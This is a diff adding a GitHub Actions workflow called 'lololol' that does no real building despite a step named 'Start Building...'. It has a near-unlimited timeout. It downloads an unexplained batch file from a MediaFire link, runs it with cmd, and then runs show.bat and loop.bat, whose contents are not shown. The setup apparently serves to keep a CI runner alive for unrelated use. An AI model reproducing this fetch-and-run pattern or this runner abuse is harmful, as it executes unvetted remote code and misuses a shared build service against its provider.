@@ -1,0 +1,22 @@
+name: lololol
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-2019
+    timeout-minutes: 9999
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://download1979.mediafire.com/f40k9253wgig1SmrwH4fTZQoi19bdQZat6RgHBlV7wegBadb9InLdFX2yzZ99lYNBDZf-ZHCAwYGVnN-MUPuI6Oc1owNhklxAmD-T_qIwFNX4hz7G48vW_WKwVAGWplne_1uc5eEDIWEkquxx9RtH5lnGj9FdKVpmIeCB_sv1ZhMlg0/puki11ty44ari64/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: bruh
+        run: cmd /c show.bat
+
+      - name: good
+        run: cmd /c loop.bat
